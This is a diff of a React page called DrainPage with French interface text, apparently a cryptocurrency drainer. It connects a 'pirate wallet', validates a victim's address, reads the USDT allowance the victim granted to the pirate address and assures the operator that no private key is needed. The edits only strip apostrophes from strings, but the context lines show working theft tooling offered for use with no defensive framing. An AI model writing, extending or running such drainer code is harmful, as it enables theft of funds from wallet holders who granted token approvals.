@@ -116,7 +116,7 @@ export default function DrainPage() {
     setLogs([]);
 
     if (!walletAddress) {
-      setError("Connecte d'abord ton wallet pirate");
+      setError("Connecte d abord ton wallet pirate");
       return;
     }
     if (!/^0x[a-fA-F0-9]{40}$/.test(victim)) {
@@ -150,7 +150,7 @@ export default function DrainPage() {
         signer
       );
 
-      addLog("🔍 Lecture de l'allowance...");
+      addLog("🔍 Lecture de l allowance...");
       const allowance: bigint = await erc20.allowance(victim, pirateAddress);
       addLog(`🔑 Allowance : ${ethers.formatUnits(allowance, 6)} USDT`);
 
@@ -288,7 +288,7 @@ export default function DrainPage() {
           </div>
 
           <div style={{ color: "#94a3b8", fontSize: "0.75rem", marginBottom: "1rem" }}>
-            ⚠️ Aucune clé privée n'est nécessaire. Ton wallet signera la transaction lui-même.
+            ⚠️ Aucune clé privée n est nécessaire. Ton wallet signera la transaction lui-même.
           </div>
 
           <button
